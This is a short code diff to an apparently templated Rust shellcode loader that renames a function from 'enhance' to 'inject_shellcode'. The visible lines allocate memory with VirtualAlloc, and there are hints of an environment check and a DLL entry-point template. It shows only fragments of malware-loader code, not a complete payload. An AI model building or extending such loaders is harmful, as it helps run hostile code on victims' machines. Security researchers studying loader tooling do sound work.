@@ -32,7 +32,7 @@ fn check_environment() -> bool {
 }
 
 
-fn enhance(mut buf: Vec<u8>) {
+fn inject_shellcode(mut buf: Vec<u8>) {
     unsafe {
         let alloc = VirtualAlloc(null(), buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if alloc.is_null() { return; }
@@ -72,7 +72,7 @@ fn main() {
 
     {{MAIN}}
 
-    enhance(vec);
+    inject_shellcode(vec);
 }
 
 {{DLL_MAIN}}
